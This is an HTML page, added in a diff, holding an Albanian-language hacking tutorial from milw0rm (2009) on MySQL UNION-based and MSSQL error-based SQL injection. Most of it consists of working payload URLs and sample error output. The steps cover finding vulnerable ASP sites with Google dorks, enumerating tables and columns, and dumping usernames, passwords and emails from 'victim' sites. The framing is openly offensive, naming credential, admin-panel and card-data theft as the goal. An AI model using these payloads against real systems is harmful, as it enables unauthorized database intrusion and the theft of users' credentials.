@@ -1,0 +1,594 @@
+<html>
+<head>
+<title>[albanian] SQL Injection</title>
+<pre>
+                                                                           [_][-][X] 
+      _  ___  _  ___      ___ ___ _____      __  ___ __   __  ___        
+     | |/ / || |/ __|___ / __| _ \ __\ \    / / |_  )  \ /  \/ _ \       
+     | ' &lt;| __ | (_ |___| (__|   / _| \ \/\/ /   / / () | () \_, /       
+     |_|\_\_||_|\___|    \___|_|_\___| \_/\_/   /___\__/ \__/ /_/        
+                                                                           
+                                                                         
+      Red n'black i dress eagle on my chest. 
+      It's good to be an ALBANIAN Keep my head up high for that flag i die. 
+      Im proud to be an ALBANIAN
+   ################################################################### 
+
+
+       Author         	: boom3rang		 	                  
+       Contact        	: boom3rang[at]live.com                          
+       Greetz     	: H!tm@N - KHG - cHs
+
+		  R.I.P redc00de
+
+   --------------------------------------------------------------------
+
+1. SQL-injetion-Tutorial
+######################
+
+1.1 Cka është SQL-injetion?
+1.2 Provo faqen për vulnerability!
+1.3 Si të zbulojmë sa numra te kolumnave egzistojnë?
+1.4 Provo për UNION SELECT funksionin!
+1.5 Si të zbulojmë verzionin e MYSQL-së?
+1.6 Si të zbulojmë Table_name?
+1.7 Si të zbulojmë Column_name?
+1.8 Përfundim?
+
+
+  ============================
+   1.1 Cka është SQL-injetion?
+  ============================
+
+-SQL-injetion është pra një ndër metodat më të perdorura ditët e sodit për të marr akses në ndonjë webfaqe. 
+Kjo metodë i jep leje sulmuesit që të sulmon përmes URL-së. 
+Me  këtë metodë sulmuesi ka mundësi të marrë informata të ndryshme nga MYSQL-së,(username,passwords), logins të ndryshëm, akses nëpër faqe të administrimit, CC  etj...
+
+
+
+  ====================================
+   1.2 Provo faqen për vulnerability!!
+  ====================================
+
+Të themi se kemi dicka të till:
+
+------------------------------------
+http://www.site.com/vesti.php?id=1
+------------------------------------
+
+
+Tani që të testojm se a është faqa vulnerability, apo thjesht a ka buggs shkojm dhe ja shtojm (') pra presjen lart, e cila do të duket kështu:
+
+------------------------------------
+http://www.site.com/vesti.php?id=1'
+------------------------------------
+
+Pra pas këtij veprimi, nëse na jepë ndonjë error si psh.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+&quot;You have an error in your SQL syntax;&quot; ose &quot;Warning: mysql_result() [function.mysql-result]:&quot;
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Me këtë nënkuptohet se faqja është vulnerability, pra ka lëshime!
+
+
+
+
+  =====================================================
+   1.3 Si të zbulojmë sa numra te kolumnave egzistojnë?
+  =====================================================
+
+Për të gjetur sa sa Kolumna kemi përdorim: ORDER BY
+Pra &quot;order by&quot; pa presje do të na ndihmon të gjejmë se sa kolumna kemi ne faqen viktimes, shkojm me shembull:
+
+-----------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 1--     &lt;--&gt;     Hapet faqja normal pra nuk na jep Error
+-----------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 2--     &lt;--&gt;     Hapet faqja normal pra nuk na jep Error
+-----------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 3--     &lt;--&gt;     Hapet faqja normal pra nuk na jep Error
+-----------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 4--     &lt;--&gt;     Hapet faqja normal pra nuk na jep Error
+-----------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 5--     &lt;--&gt;     Error page - Pra këtu kemi error!
+-----------------------------------------------------------------------------------------------------
+
+-Me këtë nënkuptojm se tek kjo faqe kemi 4 Kolumna, pra e marim numrin e fundit i cili nuk jep error!
+
+
+
+  =======================================
+   1.4 Provo për UNION SELECT funksionin!
+  =======================================
+
+Pra tani do të provojmë që të nxjerim numrat e kolumnave dhe të dhenat tjera në dritare, përmes &quot;Union select&quot;.
+
+Nëse kemi 4 numra te kolumnave në shembull, do të dukej dicka e tillë:
+
+---------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 union select 1,2,3,4--
+---------------------------------------------------------------
+
+Nëse tek dritarja na shfaqen ndonjeri prej numrave prej 1-4 atëherë mirë është dhe funksionon krejt në rregull por në qoft se jo atëhere provoni të ja shtoni nji - (minus) perpara tek &quot;1(njëshi)&quot; i parë pra, numrat munden të ndryshojnë mundë të jenë 50,71,9999 etj shembull:
+
+-------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-50 union select 1,2,3,4--
+-------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-71 union select 1,2,3,4--
+-------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-9999 union select 1,2,3,4--
+-------------------------------------------------------------------
+
+Tani duhet të shfaqet ndonjëri prej 4 numrave prej 1-4. 
+Nëse shfaqet ndonjeri prej këtyre numrave atëhere gjithcka është në rregull!
+
+
+
+  =========================================
+   1.5 Si të zbulojmë verzionin e MYSQL-së?
+  =========================================
+
+Si të zbulojmë verzionin e mysql-së është lehtë, këte mundemi te bejme duke zevendesuar numrin e kolumnes me kete &quot;@@version&quot;.
+Më pas duhet të na shfaqet se cfar verzioni eshte prezente ne faqen e viktimes.
+Të themi se numri i cili shfaqet ne dritare eshte 3-shi, per te treguar me qarte do ju tregoj me shembullin me poshte.
+
+--------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-9999 union select 1,2,@@version,4--
+--------------------------------------------------------------------------
+
+Dhe tani me do te na shfaqet versionin ne dritare. 
+Duhet cekur se tek verzioni 5.x.x , kemi mundesi te marrim tabelat&amp;kolumnat duke perdorur funksionin &quot;INFORMATION_SCHEMA&quot; kurse tek verzionet me te vjetra kjo mundesi apo funksion nuk egziston.
+ 
+
+
+  =============================
+   1.6 Si të zbulojmë Table_name?
+  =============================
+
+Sic kam cekur dhe me larte se egziston nje problem i vogel tek verzionet e vjetra te MYSQL-se (4.x.x. 3.x.x etj.)
+Per kete arsye do ju tregoj njeher si duhet vepruar nese verzioni i mysql-se eshte 4.x.x e me pas per versionet 5.x.x.
+
+VERSION 4.x.x
+Per te gjetur table_name tek verzionet e vjetra(4.x.x, 3.x.x) skemi ndonje menyre te avancuar, pervec qe te provojmë permendsh tabelat dhe duke perdorur pak logjiken.
+Per keto verzione preferohet te merrni nje list te madhe te tabelave dhe ti provoni.
+Si tabela me te perdorura jane: users, user, admin, admins , member , members, login, administrators, mysql.user etj..
+
+VERSION 5.x.x
+Tani nese e vereni se faqja ka versionin 5.x.x eshte lehte pasi qe tani kemi mundesi te vendosim ne perdorim funksionin &quot;INFORMATION_SCHEMA.TABLES&quot; per te zbuluar tabelat dhe &quot;INFORMATION_SCHEMA.COLUMNS&quot; kolumnat.
+
+Per te gjetur tabelat shkojme si tek shembulli me poshte:
+
+----------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-9999 union select 1,2,table_name,4+from+information_schema.tables--
+----------------------------------------------------------------------------------------------------------
+
+Pra table_name e zevendesojme me numrin qe na shfaqet ne dritare, dhe me pas duhet te na shafqen tabela.
+
+
+
+  ===============================
+   1.7 Si të zbulojmë Column_name?
+  ===============================
+E njejta gje vlen edhe per gjetjen e kolumnave(column_name) sikur tek table_name!
+
+VERSION 4.x.x
+Si kolumna me te perdorura jane: username , usern , user_name , usr , usn , pass , password , passwd , pwd , email , emailadress etj...
+
+VERSION 5.x.x
+Per te zbuluar emrat e kolumnave sic thash dhe me pare eshte njesoj sikur tek pjesa e tabela vetem se ne kete rast, ne vend ku shkruan tables duhet vendosur column/s.
+
+Shkojm te shfaqim me shembull edhe kete:
+-----------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-82 union select 1,2,column_name,4+from+information_schema.columns--
+-----------------------------------------------------------------------------------------------------------
+
+Tani per te zgjedhur vetem nje tabel dhe per ti zbuluar vetem emrat e kolumnave te saj shkojme si ne shembullin:
+
+----------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-82 union select 1,2,column_name,4+from+information_schema.columns+where+table_name=USERS--
+----------------------------------------------------------------------------------------------------------------------------------
+
+Dmth ne kete rast do te shfaqen vetem column_name per tabelen &quot;Users&quot; .
+
+
+Tani per fund, te themi që table_name është (users) dhe column_name jane(username, password, email).
+
+Ja keshtu duhet vepruar qe te na shfaqen te dhenat nga MYSQL:
+
+-----------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-71 union select 1,2,concat(username,char(58),password,char(58),email),4 from users--
+-----------------------------------------------------------------------------------------------------------------------------
+
+Concat() = Perdoret per te bashkur 2,3.. ose me shum kolumna ne nje vendë.
+CHAR(58) = Jane dy pika(:) qe bejne ndarjen ne mes column_name(së)!
+
+
+
+  ================
+   1.8 Përfundim?
+  ================
+
+Dhe si përfundim do i postoj te gjith linqet ne nje vend qe te keni me leht per tu bazuar!
+
+==============================================================================================================================
+http://www.site.com/vesti.php?id=1
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1'
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 1--     &lt;--&gt;     Hapet faqja normal pra nuk na jep Error
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 2--     &lt;--&gt;     Hapet faqja normal pra nuk na jep Error
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 3--     &lt;--&gt;     Hapet faqja normal pra nuk na jep Error
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 4--     &lt;--&gt;     Hapet faqja normal pra nuk na jep Error
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 order by 5--     &lt;--&gt;     Error page - Pra këtu kemi error!
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=1 union select 1,2,3,4--
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-9999 union select 1,2,3,4--
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-9999 union select 1,2,@@version,4--
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-9999 union select 1,2,table_name,4+from+information_schema.tables--
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-82 union select 1,2,column_name,4+from+information_schema.columns--
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-82 union select 1,2,column_name,4+from+information_schema.columns+where+table_name=USERS--
+------------------------------------------------------------------------------------------------------------------------------
+http://www.site.com/vesti.php?id=-71 union select 1,2,concat(username,char(58),password,char(58),email),4 from users--
+==============================================================================================================================
+
+
+____________________________________________________________________________________________________________________________________
+####################################################################################################################################
+
+
+
+2. MSSQL - injection, Metoda e sulmit!
+######################################
+
+2.1 Hyrje
+2.2 Si të kërkojmë faqe vulnerability?
+2.3 Si të provojmë se a është faqja vulnerability?
+2.4 Si të zbulojmë verzionin/emrin e DB-së?
+2.5 Si të zbulojmë, emrat e tabelave(table_name)?
+2.6 Si të zbulojmë, emrat e kolumnave(column_name)?
+2.7 Si të marrim të dhënat nga tabelat që na interesojnë(psh. username,pass, email etj)?
+2.8 Përfundimi?
+
+
+
+     [ 2.1 HYRJE ]
+    ###############
+
+Përshëdetje!
+Në këtë mësim, do të mundohem që të ju shpjegoj për një teknikë tjetër tashmë të njohur, MSSQL-injection.
+Dmth do të keni rastin të mësoni se si përdoret kjo metodë, si veprohet pët te marrë të dhëna (username, password, ose logins) ose info tjera të ndryshme përmes kesaj teknike.
+MSSQL-injection, mundemi të përdorim për produktet të cilat janë të krijuar nga kompania e njohur Microsoft.
+Ky lloj i injection, pra merret me ato faqe të cilat janë të koduara ne ASP/ASPX etj.
+
+Egzistojnë disa lloje të sulmeve për këtë metode si:
+
+ * - MSSQL Normal SQL Injection Attack
+ * - MSSQL Injection in web Services (SOAP Injection)
+ * - MSSQL Injection with UNION Attack
+ * - ODBC Error Message Attack with &quot;CONVERT&quot;
+ * - MSSQL Blind SQL Injection Attack etj..
+
+Për këtë shkrimë do të përdorim këtë lloj të sulmit:  
+&quot;ODBC Error Message Attack with &quot;CONVERT&quot;
+
+
+    
+     [ 2.2 Si të kërkojmë faqe vulnerability? ]
+    ############################################
+
+Si të kërkojmë faqe të cilat janë vulnerability, është lehtë. Këtë mundemi të bëjmë duke përdorur shërbimet e kompanisë gigante GOOGLE.
+
+Shkojmë hapim:    www.google.com  
+
+Dhe shkruajmë psh:    inurl:&quot;.asp&quot; &quot;id&quot;  
+                      inurl:&quot;news.asp&quot; &quot;menu&quot;  
+                      inurl:&quot;content.asp&quot; &quot;sub&quot;
+                      inurl:&quot;games.asp&quot; &quot;id&quot;             
+                      ETJ....(Unë vendosa disa shembujë, tash ti përdorë logjiken, për dorks më të mira)
+
+
+
+
+
+     [ 2.3 Si të provojmë se a është faqja vulnerability? ]
+    ########################################################
+
+Këtë gjë mundemi të kuptojmë shumë lehtë duke shtuar pas id-së së faqes një presje larte ('). 
+Dhe në rastë se na jep reply duke na shfaqur ndonjë error nënkuptohet se faqja është vulnerability psh:
+
+++++++++++++++++++++++++++++++++++++++
+/ODBC Microsoft Access Driver/
+++++++++++++++++++++++++++++++++++++++
+/Unclosed quotation mark/
+++++++++++++++++++++++++++++++++++++++
+/Microsoft OLE DB Provider for Oracle/
+++++++++++++++++++++++++++++++++++++++
+/Division by zero in/
+++++++++++++++++++++++++++++++++++++++
+
+Këto janë disa nga përgjigjet më të shpeshta që shfaqen nëpër faqe të cilat janë vulnerability, për MSSQL - injection.
+
+Tani si duhet vepruar ja një shembull, pra ku duhet të vendosim presjen lartë(').
+
+psh:
+--------------------------------------
+www.localhost.com/lajmi.asp?id=100'
+--------------------------------------
+
+Tani të themi se na është shfaqur një gabimë:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Microsoft OLE DB Provider for SQL Server error '80040e14'
+
+Unclosed quotation mark after the character string ') AND (Volgorde &gt; 0) ORDER BY Volgorde'.
+
+/msn/shared/includes/main_rub.asp, line 4 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Dmth faqja është vulnerability!
+
+
+
+
+      [ 2.4 Si të zbulojmë verzionin/emrin e DB-së? ]
+     #################################################
+
+Shkojmë me shembull për të kuptuar më lehtë:
+
+Version:
+--------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(@@version))--
+--------------------------------------------------------------------
+
+Dhe do na paraqitet psh:
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2008 (SP1) - 10.0.2531.0 (X64) Mar 29 2009 10:11:52 Copyright (c) 1988-2008 Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.0 &lt;X64&gt; (Build 6002: Service Pack 2) (VM) ' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+Tani për të zbuluar Db_Name shkojmë:
+---------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(db_name()))--
+---------------------------------------------------------------------
+
+psh.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'KHG_CREW_DB' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4  
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+
+      [ 2.5 Si të zbulojmë, emrat e tabelave(table_name) ]
+     ######################################################
+
+Per të zbuluar apo thjesht për të gjetur tabelat e ndonjë faqe përmes kësaj metode shkojmë.
+
+psh:
+------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 table_name from information_schema.tables))--
+------------------------------------------------------------------------------------------------------------------
+Dhe tani do te shfaqet nje error si psh:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'Users' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Dmth në këtë rastë tabela(table_name) e parë është 'Users' , tani për të gjetur shkojmë tabelën e radhës:
+
+psh:
+----------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('Users')))--
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Dhe tani do shfaqet nje error i njejt dhe do të jep tabelën e dytë:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'lajmet' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Tabela tjetër në këtë rastë është 'lajmet'
+
+Tani për të gjetur tabelen(table_name) e tretë shkojmë kështu:
+
+psh:
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('Users' , 'lajmet')))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Dhe do na shfaqet tabela e tretë:
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'categories' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Tabela e tretë është pra 'categories', dhe vazhdojmë kështu me radhë deri sa ti zbulojmë të gjitha tabelat.
+
+psh:
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('Users' , 'lajmet' , 'categories')))--
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+     [ 2.6 Si të zbulojmë, emrat e kolumnave(column_name) ]
+    ########################################################
+
+
+-Nëse duam të nxjerim column_name për tabelën 'Users' shkojmë:
+
+psh:
+---------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 column_name from information_schema.columns where table_name='Users'))--
+---------------------------------------------------------------------------------------------------------------------------------------------
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'Username' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Pra emrin i kolumnës së parë për tabelën(table_name) 'Users' është 'username'
+
+Tani shkojmë të gjejmë kolumnën(column_name) e dytë për tabelën e njejtë 'Users':
+
+psh:
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 column_name from information_schema.columns where table_name='Users' and column_name not in ('username')))--
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'password' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Emri i kolumnes(column_name) së dytë është 'password', tani shkojmë të gjejmë column_name e rradhës:
+
+psh:
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 column_name from information_schema.columns where table_name='Users' and column_name not in ('username' , 'password')))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'emailaddress' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Colum_name e tretë është pra 'emailaddress' dhe kështu vazhdojmë me radhë deri në fund, deri pra sa ti gjejm të gjitha kolumnat(column_name)!
+
+
+
+
+
+     [ 2.7 Si të marrim të dhënat që na interesojnë(username,pass, email etj) ]
+    ############################################################################
+
+Për të bërë një gjë të till nuk kemi ndonjë gjë ndyshe nga se kemi cekur më parë. 
+Në këtë pjesë e tëra që duhet bërë është të zevenësojmë tabelen(table_name) dhe emrat e kolumnave(column_name) nëpër vendet e tyre që më parë i kemi gjetur.
+
+Për këtë pjesë do ti përdorim:
+Table_name = Users
+Column_name = username , password , emailaddress !
+
+Shkojmë tani ti zëvendësojmë psh:
+-------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 username from Users))--
+-------------------------------------------------------------------------------------------
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value 'Admin' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+username: Admin
+
+Zëvendësojmë tani kolumnën e parë &quot;username&quot; me kolumnën e dytë &quot;password&quot;:
+
+psh:
+-------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 password from Users))--
+-------------------------------------------------------------------------------------------
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ Microsoft OLE DB Provider for SQL Server error '80040e07'
+
+Conversion failed when converting the nvarchar value '123456' to data type int.
+
+/msn/shared/includes/main_rub.asp, line 4
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+password: 123456
+
+Tani për të zëvendësuar kolumnat e rradhës veprojmë njësoj, si më lartë:
+
+psh:
+-----------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 emailaddress from Users))--
+-----------------------------------------------------------------------------------------------
+
+emailaddress: boom3rang@live.com
+
+Ja pra kemi arritur të marrim disa nga info-të, si username/pass dhe emailaddress e një faqe.
+
+username: Admin
+password: 123456
+emailaddress: boom3rang@live.com
+
+
+     [ 2.8 Përfundim ]
+    ###################
+
+Dhe ketu si përfundim do i postojm të gjitha linqet!
+
+=============================================================================================================================================================================================
+www.localhost.com/lajmi.asp?id=100'
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(@@version))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(db_name()))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 table_name from information_schema.tables))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('Users')))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('Users' , 'lajmet')))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('Users' , 'lajmet' , 'categories')))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 column_name from information_schema.columns where table_name='Users'))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 column_name from information_schema.columns where table_name='Users' and column_name not in ('username')))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 column_name from information_schema.columns where table_name='Users' and column_name not in ('username' , 'password')))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 username from Users))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 password from Users))--
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+www.localhost.com/lajmi.asp?id=100+or+1=convert(int,(select top 1 emailaddress from Users))--
+=============================================================================================================================================================================================
+
+
+####################################################
+[&gt;&gt;] Special Greetz: milw0rm - KHG-CREW - TT-AL 
+####################################################
+
+# milw0rm.com [2009-07-16]</pre>
+</html>
